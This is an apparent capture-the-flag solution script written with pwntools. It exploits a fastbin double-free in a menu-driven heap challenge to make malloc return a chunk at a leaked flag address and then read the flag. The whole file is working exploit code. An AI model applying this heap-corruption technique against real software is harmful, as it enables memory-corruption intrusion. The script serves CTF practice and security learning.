#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

#chall = "./hoge"
#libc = ELF()
#elf = ELF(chall)
#context.binary = chall
#context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("localhost", 9001)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def add(index):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil(": ")
    p.sendline(index)


def delete(index):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil(": ")
    p.sendline(index)

def read(index):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil(": ")
    p.sendline(index)

def write(index, buffer):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil(": ")
    p.sendline(index)
    p.recvuntil("> ")
    p.sendline(buffer)

p.recvuntil("located at ")
flag_addr = eval(p.recv(14))
log.info("flag_addr: 0x{:08x}".format(flag_addr))

add('A')
add('B')

# double free
delete('A')# fastbin -> A
delete('B')# fastbin -> B -> A
delete('A')# fastbin -> A -> B -> A -> B...

add('C')# C == A in fastbin
write('C', p64(flag_addr - 0x10))
add('C')
add('C')
add('C')# malloc flag
read('C')




p.interactive()
